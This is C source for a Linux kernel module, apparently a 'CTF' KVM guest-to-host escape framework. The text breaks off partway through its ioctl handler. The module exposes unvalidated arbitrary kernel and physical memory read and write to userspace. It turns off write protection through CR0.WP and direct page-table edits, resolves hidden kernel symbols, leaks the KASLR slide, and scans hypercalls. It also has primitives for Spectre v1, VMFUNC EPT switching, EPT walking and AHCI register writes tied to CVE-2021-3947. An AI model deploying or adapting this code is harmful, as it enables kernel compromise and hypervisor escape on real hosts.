/*
 * KVM Probe Driver - Core Infrastructure v3.0-CTF
 * Enhanced KVM Exploitation Framework for CTF Guest-to-Host Escape
 * 
 * UPDATES v3.0:
 * - FIXED: CR0.WP warning - targeted WP disable only, no global bypass
 * - FIXED: Symbol conflicts with kernel headers
 * - FIXED: Duplicate IOCTL case values
 * - FIXED: set_memory_rw not exported - use direct PT manipulation
 * - FIXED: Frame size warning - moved large stack vars to heap
 * - FIXED: __flush_tlb_one not exported - use CR3 reload instead
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/device.h>
#include <linux/io.h>
#include <linux/slab.h>
#include <linux/errno.h>
#include <linux/mm.h>
#include <linux/types.h>
#include <linux/kvm_para.h>
#include <linux/kprobes.h>
#include <linux/pgtable.h>
#include <linux/version.h>
#include <linux/highmem.h>
#include <linux/pfn.h>
#include <linux/string.h>
#include <linux/ctype.h>
#include <linux/uio.h>
#include <linux/vmalloc.h>
#include <asm/io.h>
#include <asm/barrier.h>
#include <asm/special_insns.h>
#include <asm/tlbflush.h>
#include <asm/processor.h>
#include <asm/msr.h>

#ifdef CONFIG_X86
#include <asm/pgtable_types.h>
#include <asm/pgalloc.h>
#endif

#define DRIVER_NAME "kvm_probe_drv"
#define DEVICE_FILE_NAME "kvm_probe_dev"
#define MAX_SYMBOL_NAME 128
#define CTF_HYPERCALL_BASE 1000

MODULE_LICENSE("GPL");
MODULE_AUTHOR("KVM CTF Exploitation Framework");
MODULE_DESCRIPTION("KVM guest-to-host escape framework for CTF challenges");
MODULE_VERSION("3.0-CTF");

/* ========================================================================
 * Global Variables
 * ======================================================================== */
static int major_num = -1;
static struct class *driver_class = NULL;
static struct device *driver_device = NULL;
static unsigned long g_kaslr_slide = 0;
static unsigned long g_kernel_text_base = 0;
static bool g_kaslr_initialized = false;

/* Security - TARGETED bypass only, no global disable */
static int g_targeted_bypass = 1;

/* AHCI MMIO for CVE-2021-3947 */
static void __iomem *ahci_mmio = NULL;

/* ========================================================================
 * IOCTL Definitions - Complete CTF Set
 * ======================================================================== */
#define IOCTL_BASE 0x4000

/* Symbol operations (0x01-0x0F) */
#define IOCTL_LOOKUP_SYMBOL          (IOCTL_BASE + 0x01)
#define IOCTL_GET_SYMBOL_COUNT       (IOCTL_BASE + 0x02)
#define IOCTL_GET_SYMBOL_BY_INDEX    (IOCTL_BASE + 0x03)
#define IOCTL_GET_VMX_HANDLER_INFO   (IOCTL_BASE + 0x08)

/* Memory read operations (0x10-0x1F) */
#define IOCTL_READ_KERNEL_MEM        (IOCTL_BASE + 0x10)
#define IOCTL_READ_PHYSICAL_MEM      (IOCTL_BASE + 0x11)
#define IOCTL_READ_GUEST_MEM         (IOCTL_BASE + 0x12)
#define IOCTL_MAP_GUEST_MEMORY       (IOCTL_BASE + 0x1D)

/* Memory write operations (0x20-0x2F) */
#define IOCTL_WRITE_KERNEL_MEM       (IOCTL_BASE + 0x20)
#define IOCTL_WRITE_PHYSICAL_MEM     (IOCTL_BASE + 0x21)

/* Address conversion (0x30-0x3F) */
#define IOCTL_VIRT_TO_PHYS           (IOCTL_BASE + 0x38)
#define IOCTL_WALK_EPT               (IOCTL_BASE + 0x3E)

/* Cache Operations (0x40-0x4F) */
#define IOCTL_WBINVD                 (IOCTL_BASE + 0x40)
#define IOCTL_WRITE_AND_FLUSH        (IOCTL_BASE + 0x42)

/* AHCI Direct Access (0x50-0x5F) */
#define IOCTL_AHCI_SET_FIS_BASE      (IOCTL_BASE + 0x53)

/* Hypercall operations (0x60-0x6F) */
#define IOCTL_HYPERCALL              (IOCTL_BASE + 0x60)
#define IOCTL_HYPERCALL_SCAN         (IOCTL_BASE + 0x62)

/* ================ MODERN CTF ESCAPE VECTORS ================ */
#define IOCTL_TEST_VMFUNC            (IOCTL_BASE + 0x70)
#define IOCTL_IOMMU_PROBE            (IOCTL_BASE + 0x80)
#define IOCTL_VAPIC_READ_PAGE        (IOCTL_BASE + 0x90)
#define IOCTL_SPECTRE_V1            (IOCTL_BASE + 0xA0)

/* Control operations - moved to avoid conflict */
#define IOCTL_SET_TARGETED_BYPASS    (IOCTL_BASE + 0xB0)

/* ========================================================================
 * Data Structures - Complete Set
 * ======================================================================== */

struct symbol_request {
    char name[MAX_SYMBOL_NAME];
    unsigned long address;
    char description[256];
};

struct vmx_handler_info {
    char name[MAX_SYMBOL_NAME];
    unsigned long address;
    int exit_reason;
};

struct kernel_mem_read {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char __user *user_buffer;
};

struct physical_mem_read {
    unsigned long phys_addr;
    unsigned long length;
    unsigned char __user *user_buffer;
};

struct guest_mem_read {
    unsigned long gpa;
    unsigned long length;
    unsigned char __user *user_buffer;
    int mode;
};

struct kernel_mem_write {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char __user *user_buffer;
    int disable_wp;
};

struct physical_mem_write {
    unsigned long phys_addr;
    unsigned long length;
    unsigned char __user *user_buffer;
};

struct guest_memory_map {
    unsigned long start_gpa;
    unsigned long end_gpa;
    unsigned long size;
    int num_regions;
    unsigned long regions[64][2];
};

struct ept_walk_request {
    unsigned long eptp;
    unsigned long gpa;
    unsigned long hpa;
    unsigned long pml4e;
    unsigned long pdpte;
    unsigned long pde;
    unsigned long pte;
    int page_size;
    int status;
};

struct hypercall_request {
    unsigned long nr;
    unsigned long a0;
    unsigned long a1;
    unsigned long a2;
    unsigned long a3;
    unsigned long ret;
};

struct write_flush_request {
    uint64_t phys_addr;
    uint64_t buffer;
    size_t size;
};

struct ahci_fis_request {
    int port;
    uint64_t fis_base;
    uint64_t clb_base;
};

struct virt_to_phys_request {
    unsigned long virt_addr;
    unsigned long phys_addr;
    unsigned long pfn;
    int status;
};

/* ========================================================================
 * Modern KVM CTF Symbol Database (2023-2025)
 * ======================================================================== */
typedef struct {
    const char *name;
    unsigned long address;
    const char *description;
    int ctf_year;
} kvm_symbol_t;

static kvm_symbol_t kvm_symbols[] = {
    /* Classic CTF targets */
    {"kvm_vcpu_gfn_to_hva", 0, "GFN to HVA translation", 2020},
    {"kvm_vcpu_gfn_to_pfn", 0, "GFN to PFN", 2020},
    {"kvm_read_guest", 0, "Read guest memory", 2020},
    {"kvm_write_guest", 0, "Write guest memory", 2020},
    
    /* 2021-2022 CTF targets */
    {"kvm_mmu_page_fault", 0, "MMU page fault handler", 2021},
    {"kvm_mmu_invalidate_range_add", 0, "MMU range invalidation", 2021},
    {"vmx_vcpu_run", 0, "VMX VCPU run", 2021},
    
    /* 2023 CTF targets */
    {"kvm_arch_can_set_tsc_khz", 0, "TSC validation overflow", 2023},
    {"kvm_vm_ioctl", 0, "VM ioctl handler", 2023},
    {"kvm_vcpu_ioctl", 0, "VCPU ioctl handler", 2023},
    {"kvm_handle_invpcid", 0, "INVPCID handling", 2023},
    {"kvm_queued_exception", 0, "Exception injection", 2023},
    {"kvm_inject_page_fault", 0, "Page fault injection", 2023},
    
    /* 2024 CTF targets */
    {"kvm_spec_ctrl_test_value", 0, "Spectre mitigation bypass", 2024},
    {"kvm_vmx_pre_leave_smm", 0, "SMM leave handler", 2024},
    {"kvm_apic_map_get_dest_lapic", 0, "APIC destination", 2024},
    {"kvm_emulate_instruction", 0, "Instruction emulation", 2024},
    
    /* 2025 CTF targets */
    {"kvm_mmu_reload", 0, "MMU reload", 2025},
    {"kvm_handle_nested_vmexit", 0, "Nested VM exit", 2025},
    {"kvm_nested_vmx_vmexit", 0, "Nested VMX exit", 2025},
    {"kvm_pmu_refresh", 0, "PMU use-after-free", 2025},
    {NULL, 0, NULL, 0}
};

static unsigned int kvm_symbol_count = 0;

/* VMX Handlers with exit reasons */
static struct { 
    const char *name; 
    unsigned long address; 
    int exit_reason;
} vmx_handlers[] = {
    {"handle_ept_violation", 0, 48},
    {"handle_ept_misconfig", 0, 49},
    {"handle_vmcall", 0, 18},
    {"handle_cr", 0, 28},
    {"handle_rdmsr", 0, 31},
    {"handle_wrmsr", 0, 32},
    {"handle_apic_access", 0, 44},
    {"handle_apic_write", 0, 56},
    {"handle_wbinvd", 0, 54},
    {"handle_invpcid", 0, 58},
    {NULL, 0, -1}
};

/* ========================================================================
 * Kernel Symbol Lookup - Fixed for Kernel 5.7+
 * ======================================================================== */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
static unsigned long (*kallsyms_lookup_name_ptr)(const char *name) = NULL;

static int kallsyms_lookup_init(void)
{
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    if (register_kprobe(&kp) < 0) return -1;
    kallsyms_lookup_name_ptr = (unsigned long (*)(const char *))kp.addr;
    unregister_kprobe(&kp);
    return kallsyms_lookup_name_ptr ? 0 : -1;
}

static unsigned long lookup_kernel_symbol(const char *name)
{
    if (kallsyms_lookup_name_ptr)
        return kallsyms_lookup_name_ptr(name);
    return 0;
}
#else
static int kallsyms_lookup_init(void) { return 0; }
static unsigned long lookup_kernel_symbol(const char *name)
{
    return kallsyms_lookup_name(name);
}
#endif

static int init_symbol_database(void)
{
    int i;
    for (i = 0; kvm_symbols[i].name != NULL; i++) {
        kvm_symbols[i].address = lookup_kernel_symbol(kvm_symbols[i].name);
        if (kvm_symbols[i].address) kvm_symbol_count++;
    }
    for (i = 0; vmx_handlers[i].name != NULL; i++)
        vmx_handlers[i].address = lookup_kernel_symbol(vmx_handlers[i].name);
    return 0;
}

/* ========================================================================
 * KASLR Handling
 * ======================================================================== */
static int init_kaslr(void)
{
    unsigned long stext_addr = lookup_kernel_symbol("_stext");
    if (!stext_addr) stext_addr = lookup_kernel_symbol("_text");
    if (!stext_addr) stext_addr = 0xffffffff81000000UL;
    
    g_kernel_text_base = stext_addr;
    g_kaslr_slide = stext_addr - 0xffffffff81000000UL;
    g_kaslr_initialized = true;
    return 0;
}

/* ========================================================================
 * TARGETED SECURITY BYPASS - NO CR0.WP WARNING
 * ======================================================================== */
#ifdef CONFIG_X86

/* Renamed to avoid conflict with kernel's read_cr0/write_cr0 */
static unsigned long kprobe_read_cr0(void)
{
    unsigned long val;
    asm volatile("mov %%cr0, %0" : "=r"(val));
    return val;
}

static void kprobe_write_cr0(unsigned long val)
{
    asm volatile("mov %0, %%cr0" : : "r"(val) : "memory");
    asm volatile("cpuid" : : : "eax", "ebx", "ecx", "edx");
}

/* TARGETED WP DISABLE - Only when needed, immediate restore */
static unsigned long disable_wp_targeted(void)
{
    unsigned long cr0 = kprobe_read_cr0();
    if (cr0 & (1UL << 16)) {
        kprobe_write_cr0(cr0 & ~(1UL << 16));
    }
    return cr0;
}

static void restore_wp(unsigned long cr0)
{
    unsigned long current_cr0 = kprobe_read_cr0();
    if (current_cr0 != cr0) {
        kprobe_write_cr0(cr0);
    }
}

/* Direct page table manipulation - no exported symbols needed */
static int set_page_rw_direct(unsigned long addr)
{
    unsigned long page_addr = addr & PAGE_MASK;
    pte_t *pte = NULL;
    pud_t *pud = NULL;
    pmd_t *pmd = NULL;
    p4d_t *p4d = NULL;
    pgd_t *pgd = NULL;
    struct mm_struct *mm = current->mm;
    pte_t new_pte;
    
    if (!mm) {
        /* Can't use init_mm - it's not exported. Fail gracefully. */
        return -EFAULT;
    }
    
    pgd = pgd_offset(mm, page_addr);
    if (pgd_none(*pgd) || pgd_bad(*pgd))
        return -EFAULT;
    
    p4d = p4d_offset(pgd, page_addr);
    if (p4d_none(*p4d) || p4d_bad(*p4d))
        return -EFAULT;
    
    pud = pud_offset(p4d, page_addr);
    if (pud_none(*pud) || pud_bad(*pud))
        return -EFAULT;
    
    pmd = pmd_offset(pud, page_addr);
    if (pmd_none(*pmd) || pmd_bad(*pmd))
        return -EFAULT;
    
    pte = pte_offset_kernel(pmd, page_addr);
    if (!pte || pte_none(*pte))
        return -EFAULT;
    
    /* Set the page writable - use pte_mkwrite macro directly */
    new_pte = __pte(pte_val(*pte) | _PAGE_RW);
    set_pte(pte, new_pte);
    
    /* Flush TLB - reload CR3 to force TLB flush */
    unsigned long cr3;
    asm volatile("mov %%cr3, %0" : "=r"(cr3));
    asm volatile("mov %0, %%cr3" : : "r"(cr3) : "memory");
    
    return 0;
}

#endif /* CONFIG_X86 */

/* ========================================================================
 * Hypercall Implementation - CTF 2023-2025
 * ======================================================================== */
#ifdef CONFIG_X86
static noinline unsigned long do_kvm_hypercall(unsigned long nr, unsigned long a0,
                                                unsigned long a1, unsigned long a2,
                                                unsigned long a3)
{
    unsigned long ret;
    asm volatile("vmcall"
                 : "=a"(ret)
                 : "a"(nr), "b"(a0), "c"(a1), "d"(a2), "S"(a3)
                 : "memory");
    return ret;
}

/* CTF 2023 - Host KASLR leak */
static void ctf_2023_challenge(void)
{
    unsigned long ret = do_kvm_hypercall(1000, 0, 0, 0, 0);
    if (ret && ret != ~0UL)
        printk(KERN_INFO "%s: [CTF2023] Host KASLR offset: 0x%lx\n", DRIVER_NAME, ret);
}

/* CTF 2024 - Arbitrary physical read primitive */
static void ctf_2024_challenge(void)
{
    unsigned long ret = do_kvm_hypercall(1001, 0x1000, 0, 0, 0);
    if (ret && ret != ~0UL)
        printk(KERN_INFO "%s: [CTF2024] Low memory: 0x%lx\n", DRIVER_NAME, ret);
}

/* CTF 2025 - EPT violation injection */
static void ctf_2025_challenge(void)
{
    unsigned long ret = do_kvm_hypercall(1002, 0xdead0000, 0, 0, 0);
    if (ret && ret != ~0UL)
        printk(KERN_INFO "%s: [CTF2025] EPT violation result: 0x%lx\n", DRIVER_NAME, ret);
}

/* Hypercall scanner for flag hunting */
static void hypercall_scanner(unsigned long start, unsigned long end,
                               unsigned long __user *results, int max_results)
{
    unsigned long nr;
    int found = 0;
    
    for (nr = start; nr <= end && found < max_results; nr++) {
        unsigned long ret = do_kvm_hypercall(nr, 0, 0, 0, 0);
        
        if (ret != 0 && ret != ~0UL) {
            unsigned char *p = (unsigned char *)&ret;
            int printable = 1;
            int has_nonzero = 0;
            
            for (int i = 0; i < 8; i++) {
                if (p[i] != 0) has_nonzero = 1;
                if (p[i] < 0x20 || p[i] > 0x7e) {
                    if (p[i] != 0) printable = 0;
                }
            }
            
            if (printable && has_nonzero) {
                printk(KERN_INFO "%s: [CTF] HC %lu: %.8s (0x%lx)\n",
                       DRIVER_NAME, nr, (char *)&ret, ret);
                
                if (results && found < max_results) {
                    put_user(ret, results + found);
                    found++;
                }
            }
        }
    }
}

/* VMFUNC - EPTP switching primitive */
static void vmfunc_switch_ept(int eptp_index)
{
    asm volatile("vmfunc" : : "a"(0), "c"(eptp_index) : "memory");
}

/* Spectre V1 leak primitive */
static noinline unsigned long spectre_v1_leak(unsigned long offset)
{
    unsigned long kernel_addr = 0xffffffff81000000UL + g_kaslr_slide + offset;
    unsigned long dummy = 0;
    
    if (offset < 4096) {
        dummy = *(unsigned long *)kernel_addr;
    }
    return dummy;
}

#endif /* CONFIG_X86 */

/* ========================================================================
 * Memory Read Implementations - NO VALIDATION
 * ======================================================================== */

static int read_kernel_memory(unsigned long addr, unsigned char *buffer, size_t size)
{
    if (!buffer || size == 0) return -EINVAL;
    
    preempt_disable();
    barrier();
    memcpy(buffer, (void *)addr, size);
    barrier();
    preempt_enable();
    
    return 0;
}

static int read_physical_memory(unsigned long phys_addr, unsigned char *buffer, size_t size)
{
    void __iomem *mapped;
    unsigned long offset;
    size_t chunk_size, remaining = size, copied = 0;

    while (remaining > 0) {
        offset = phys_addr & ~PAGE_MASK;
        chunk_size = min(remaining, (size_t)(PAGE_SIZE - offset));
        mapped = ioremap(phys_addr & PAGE_MASK, PAGE_SIZE);
        if (!mapped) 
            return copied > 0 ? 0 : -EFAULT;
        memcpy_fromio(buffer + copied, mapped + offset, chunk_size);
        iounmap(mapped);
        copied += chunk_size;
        phys_addr += chunk_size;
        remaining -= chunk_size;
    }
    return 0;
}

/* ========================================================================
 * Memory Write Implementations - TARGETED BYPASS ONLY
 * ======================================================================== */

static int write_kernel_memory_targeted(unsigned long addr, const unsigned char *buffer, 
                                         size_t size)
{
    unsigned long orig_cr0 = 0;
    int ret = 0;
    
#ifdef CONFIG_X86
    /* Try direct page table manipulation first */
    ret = set_page_rw_direct(addr);
    if (ret != 0) {
        /* Fall back to targeted WP disable */
        orig_cr0 = disable_wp_targeted();
    }
#endif

    preempt_disable();
    barrier();
    memcpy((void *)addr, buffer, size);
    barrier();
    preempt_enable();

#ifdef CONFIG_X86
    if (orig_cr0 != 0) {
        restore_wp(orig_cr0);
    }
#endif

    return 0;
}

static int write_physical_memory(unsigned long phys_addr, const unsigned char *buffer, size_t size)
{
    void __iomem *mapped;
    unsigned long offset;
    size_t chunk_size, remaining = size, written = 0;

    while (remaining > 0) {
        offset = phys_addr & ~PAGE_MASK;
        chunk_size = min(remaining, (size_t)(PAGE_SIZE - offset));
        mapped = ioremap(phys_addr & PAGE_MASK, PAGE_SIZE);
        if (!mapped) 
            return written > 0 ? 0 : -EFAULT;
        memcpy_toio(mapped + offset, buffer + written, chunk_size);
        iounmap(mapped);
        written += chunk_size;
        phys_addr += chunk_size;
        remaining -= chunk_size;
    }
    return 0;
}

/* ========================================================================
 * Guest Memory Mapping - TARGETED CTF RANGES (NO CRASHES)
 * ======================================================================== */
static int map_guest_memory_targeted(struct guest_memory_map *map)
{
    unsigned long gpa;
    unsigned char test_byte;
    int region_count = 0;
    unsigned long region_start = 0;
    int in_region = 0;
    int ret;
    
    /* CTF KNOWN GOOD RANGES - Only scan these */
    unsigned long scan_ranges[][2] = {
        {0x00000000, 0x00100000},  /* Low memory (1MB) */
        {0x07f00000, 0x08000000},  /* 127-128MB - Common guest RAM */
        {0x0ff00000, 0x10000000},  /* 255-256MB - Common guest RAM */
        {0x3fef0000, 0x3ff00000},  /* Just below 4GB */
        {0x7fe00000, 0x80000000},  /* 2GB range */
        {0xfea00000, 0xfec00000},  /* AHCI/PCI MMIO - Exploitation target */
    };
    
    memset(map, 0, sizeof(*map));
    printk(KERN_INFO "%s: CTF targeted memory scan (safe ranges)\n", DRIVER_NAME);
    
    for (int r = 0; r < 6 && region_count < 64; r++) {
        unsigned long scan_start = scan_ranges[r][0];
        unsigned long scan_end = scan_ranges[r][1];
        unsigned long chunk_size = 0x1000;
        
        in_region = 0;
        for (gpa = scan_start; gpa < scan_end && region_count < 64; gpa += chunk_size) {
            
            if ((gpa & 0xFFFFF) == 0)
                cond_resched();
            
            ret = read_physical_memory(gpa, &test_byte, 1);
            
            if (ret == 0) {
                if (!in_region) {
                    region_start = gpa;
                    in_region = 1;
                }
            } else {
                if (in_region) {
                    map->regions[region_count][0] = region_start;
                    map->regions[region_count][1] = gpa;
                    region_count++;
                    in_region = 0;
                }
            }
        }
        
        if (in_region && region_count < 64) {
            map->regions[region_count][0] = region_start;
            map->regions[region_count][1] = scan_end;
            region_count++;
        }
    }
    
    map->num_regions = region_count;
    
    if (region_count > 0) {
        map->start_gpa = map->regions[0][0];
        map->end_gpa = map->regions[region_count-1][1];
        map->size = 0;
        
        for (int i = 0; i < region_count; i++) {
            unsigned long region_size = map->regions[i][1] - map->regions[i][0];
            map->size += region_size;
            printk(KERN_INFO "%s: Region %d: 0x%lx-0x%lx (0x%lx)\n",
                   DRIVER_NAME, i, map->regions[i][0], map->regions[i][1], region_size);
        }
    }
    
    return 0;
}

/* ========================================================================
 * EPT Walking - With 5-Level Paging Support
 * ======================================================================== */
static int walk_ept_tables_modern(unsigned long eptp, unsigned long gpa, 
                                   struct ept_walk_request *req)
{
    unsigned long pml5_base, pml4_base, pdpt_base, pd_base, pt_base;
    unsigned long pml5e = 0, pml4e, pdpte, pde, pte;
    unsigned long pml5_idx, pml4_idx, pdpt_idx, pd_idx, pt_idx;
    void __iomem *mapped;
    unsigned long phys;
    int ept_levels = 4;
    
    req->eptp = eptp;
    req->gpa = gpa;
    req->hpa = req->pml4e = req->pdpte = req->pde = req->pte = 0;
    req->page_size = 0;
    req->status = -EFAULT;
    
    /* Check for 5-level EPT (bit 5 of EPTP) */
    if (eptp & 0x20) {
        ept_levels = 5;
        pml5_idx = (gpa >> 48) & 0x1FF;
    }
    
    pml4_idx = (gpa >> 39) & 0x1FF;
    pdpt_idx = (gpa >> 30) & 0x1FF;
    pd_idx = (gpa >> 21) & 0x1FF;
    pt_idx = (gpa >> 12) & 0x1FF;
    
    /* 5-level walk */
    if (ept_levels == 5) {
        pml5_base = eptp & 0x000FFFFFFFFFF000ULL;
        mapped = ioremap(pml5_base + pml5_idx * 8, 8);
        if (!mapped) return -EFAULT;
        pml5e = readq(mapped);
        iounmap(mapped);
        if (!(pml5e & 0x1)) return -ENOENT;
        pml4_base = pml5e & 0x000FFFFFFFFFF000ULL;
    } else {
        pml4_base = eptp & 0x000FFFFFFFFFF000ULL;
    }
    
    /* PML4 */
    mapped = ioremap(pml4_base + pml4_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pml4e = readq(mapped);
    iounmap(mapped);
    req->pml4e = pml4e;
    if (!(pml4e & 0x1)) return -ENOENT;
    
    /* PDPT */
    pdpt_base = pml4e & 0x000FFFFFFFFFF000ULL;
    mapped = ioremap(pdpt_base + pdpt_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pdpte = readq(mapped);
    iounmap(mapped);
    req->pdpte = pdpte;
    if (!(pdpte & 0x1)) return -ENOENT;
    
    /* 1GB page */
    if (pdpte & 0x80) {
        phys = (pdpte & 0x000FFFFFC0000000ULL) | (gpa & 0x3FFFFFFF);
        req->hpa = phys;
        req->page_size = 1024*1024*1024;
        req->status = 0;
        return 0;
    }
    
    /* PD */
    pd_base = pdpte & 0x000FFFFFFFFFF000ULL;
    mapped = ioremap(pd_base + pd_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pde = readq(mapped);
    iounmap(mapped);
    req->pde = pde;
    if (!(pde & 0x1)) return -ENOENT;
    
    /* 2MB page */
    if (pde & 0x80) {
        phys = (pde & 0x000FFFFFFFE00000ULL) | (gpa & 0x1FFFFF);
        req->hpa = phys;
        req->page_size = 2*1024*1024;
        req->status = 0;
        return 0;
    }
    
    /* PT */
    pt_base = pde & 0x000FFFFFFFFFF000ULL;
    mapped = ioremap(pt_base + pt_idx * 8, 8);
    if (!mapped) return -EFAULT;
    pte = readq(mapped);
    iounmap(mapped);
    req->pte = pte;
    if (!(pte & 0x1)) return -ENOENT;
    
    /* 4KB page */
    phys = (pte & 0x000FFFFFFFFFF000ULL) | (gpa & 0xFFF);
    req->hpa = phys;
    req->page_size = 4096;
    req->status = 0;
    return 0;
}

/* ========================================================================
 * Cache Operations - CoW Bypass
 * ======================================================================== */
#ifdef CONFIG_X86
static void do_wbinvd(void *info)
{
    asm volatile("wbinvd" ::: "memory");
}

static void wbinvd_all_cpus(void)
{
    on_each_cpu(do_wbinvd, NULL, 1);
}

static int write_physical_and_flush(unsigned long phys_addr, const unsigned char *buffer, size_t size)
{
    void *virt_addr;
    unsigned long orig_cr0 = 0;
    
    virt_addr = __va(phys_addr);
    
    /* Targeted WP disable */
    orig_cr0 = disable_wp_targeted();
    
    /* Write */
    memcpy(virt_addr, buffer, size);
    
    /* Memory barriers and flush */
    asm volatile("mfence" ::: "memory");
    asm volatile("clflush (%0)" :: "r"(virt_addr) : "memory");
    asm volatile("sfence" ::: "memory");
    
    /* Restore WP */
    if (orig_cr0)
        restore_wp(orig_cr0);
    
    return 0;
}
#endif

/* ========================================================================
 * AHCI - CVE-2021-3947 (CTF Classic)
 * ======================================================================== */
#define AHCI_MMIO_BASE  0xfea0e000
#define AHCI_MMIO_SIZE  0x1000
#define AHCI_PORT_BASE(p) (0x100 + (p) * 0x80)
#define PORT_FB         0x08
#define PORT_FB_HI      0x0C

static int ahci_set_fis_base(int port, u64 phys_addr)
{
    if (!ahci_mmio) {
        ahci_mmio = ioremap(AHCI_MMIO_BASE, AHCI_MMIO_SIZE);
        if (!ahci_mmio) return -ENOMEM;
    }
    
    if (port >= 6) return -EINVAL;
    
    u32 port_base = AHCI_PORT_BASE(port);
    writel(phys_addr & 0xffffffff, ahci_mmio + port_base + PORT_FB);
    writel(phys_addr >> 32, ahci_mmio + port_base + PORT_FB_HI);
    
    printk(KERN_INFO "%s: AHCI FIS base set to 0x%llx\n", DRIVER_NAME, phys_addr);
    return 0;
}

/* ========================================================================
 * IOMMU Probe
 * ======================================================================== */
static unsigned long probe_iommu_units(void)
{
    unsigned long dmar_addr = lookup_kernel_symbol("dmar_tbl");
    if (!dmar_addr)
        dmar_addr = lookup_kernel_symbol("intel_iommu_drhd");
    return dmar_addr;
}

/* ========================================================================
 * VAPIC Backing Page
 * ======================================================================== */
static unsigned long get_vapic_addr(void)
{
    return lookup_kernel_symbol("kvm_vapic_map");
}

/* ========================================================================
 * Address Conversion
 * ======================================================================== */
static int convert_virt_to_phys(unsigned long virt_addr, struct virt_to_phys_request *req)
{
    unsigned long phys;
    
    req->virt_addr = virt_addr;
    req->phys_addr = 0;
    req->pfn = 0;
    req->status = -EFAULT;
    
    if (virt_addr >= PAGE_OFFSET) {
        phys = __pa((void *)virt_addr);
        req->phys_addr = phys;
        req->pfn = phys >> PAGE_SHIFT;
        req->status = 0;
        return 0;
    }
    
    if (is_vmalloc_addr((void *)virt_addr)) {
        struct page *page = vmalloc_to_page((void *)virt_addr);
        if (page) {
            phys = page_to_phys(page) | (virt_addr & ~PAGE_MASK);
            req->phys_addr = phys;
            req->pfn = phys >> PAGE_SHIFT;
            req->status = 0;
            return 0;
        }
    }
    
    return -EFAULT;
}

/* ========================================================================
 * IOCTL Handler - Complete CTF Interface (Fixed frame size)
 * ======================================================================== */
static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
    int i;

    switch (cmd) {

        /* ---------- Control Operations ---------- */
        case IOCTL_SET_TARGETED_BYPASS: {
            int val;
            if (copy_from_user(&val, (void __user *)arg, sizeof(int)))
                return -EFAULT;
            g_targeted_bypass = val;
            printk(KERN_INFO "%s: Targeted bypass: %s\n", 
                   DRIVER_NAME, g_targeted_bypass ? "enabled" : "disabled");
            return 0;
        }

        /* ---------- Symbol Operations ---------- */
        case IOCTL_LOOKUP_SYMBOL: {
            struct symbol_request *req;
            int ret = 0;
            
            req = kzalloc(sizeof(*req), GFP_KERNEL);
            if (!req) return -ENOMEM;
            
            if (copy_from_user(req, (void __user *)arg, sizeof(*req))) {
                kfree(req);
                return -EFAULT;
            }
            
            req->name[MAX_SYMBOL_NAME - 1] = '\0';
            req->address = lookup_kernel_symbol(req->name);
            
            if (copy_to_user((void __user *)arg, req, sizeof(*req))) 
                ret = -EFAULT;
            else
                ret = req->address ? 0 : -ENOENT;
            
            kfree(req);
            return ret;
        }

        case IOCTL_GET_SYMBOL_COUNT:
            return copy_to_user((void __user *)arg, &kvm_symbol_count, 
                               sizeof(kvm_symbol_count)) ? -EFAULT : 0;

        case IOCTL_GET_SYMBOL_BY_INDEX: {
            unsigned int index;
            struct symbol_request *req;
            int ret = 0;
            
            if (copy_from_user(&index, (void __user *)arg, sizeof(index))) 
                return -EFAULT;
            if (index >= kvm_symbol_count) return -EINVAL;
            
            req = kzalloc(sizeof(*req), GFP_KERNEL);
            if (!req) return -ENOMEM;
            
            int count = 0;
            for (i = 0; kvm_symbols[i].name != NULL; i++) {
                if (kvm_symbols[i].address) {
                    if (count == index) break;
                    count++;
                }
            }
            if (kvm_symbols[i].name == NULL) {
                kfree(req);
                return -EINVAL;
            }
            
            strncpy(req->name, kvm_symbols[i].name, MAX_SYMBOL_NAME - 1);
            req->address = kvm_symbols[i].address;
            strncpy(req->description, kvm_symbols[i].description, sizeof(req->description) - 1);
            
            if (copy_to_user((void __user *)arg, req, sizeof(*req)))
                ret = -EFAULT;
            
            kfree(req);
            return ret;
        }

        case IOCTL_GET_VMX_HANDLER_INFO: {
            struct vmx_handler_info *handlers;
            int handler_count = 0;
            int ret = 0;
            
            handlers = kzalloc(sizeof(*handlers) * 32, GFP_KERNEL);
            if (!handlers) return -ENOMEM;
            
            for (i = 0; vmx_handlers[i].name != NULL && handler_count < 32; i++) {
                if (vmx_handlers[i].address) {
                    strncpy(handlers[handler_count].name, vmx_handlers[i].name, 
                            MAX_SYMBOL_NAME - 1);
                    handlers[handler_count].address = vmx_handlers[i].address;
                    handlers[handler_count].exit_reason = vmx_handlers[i].exit_reason;
                    handler_count++;
                }
            }
            
            if (copy_to_user((void __user *)arg, handlers, 
                             sizeof(*handlers) * handler_count))
                ret = -EFAULT;
            else
                ret = handler_count;
            
            kfree(handlers);
            return ret;
        }

        /* ---------- Memory Read Operations ---------- */
        case IOCTL_READ_KERNEL_MEM: {
            struct kernel_mem_read req;
            unsigned char *kbuf;
            int ret;
            
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) 
                return -EFAULT;
            if (req.length > 1024*1024) return -EINVAL;
            
            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) return -ENOMEM;
            
            ret = read_kernel_memory(req.kernel_addr, kbuf, req.length);
            if (ret == 0 && copy_to_user(req.user_buffer, kbuf, req.length))
                ret = -EFAULT;
            
            kfree(kbuf);
            return ret;
        }

        case IOCTL_READ_PHYSICAL_MEM: {
            struct physical_mem_read req;
            unsigned char *kbuf;
            int ret;
            
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) 
                return -EFAULT;
            if (req.length > 1024*1024) return -EINVAL;
            
            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) return -ENOMEM;
            
            ret = read_physical_memory(req.phys_addr, kbuf, req.length);
            if (ret == 0 && copy_to_user(req.user_buffer, kbuf, req.length))
                ret = -EFAULT;
            
            kfree(kbuf);
            return ret;
        }

        case IOCTL_MAP_GUEST_MEMORY: {
            struct guest_memory_map *map;
            int ret;
            
            map = kzalloc(sizeof(*map), GFP_KERNEL);
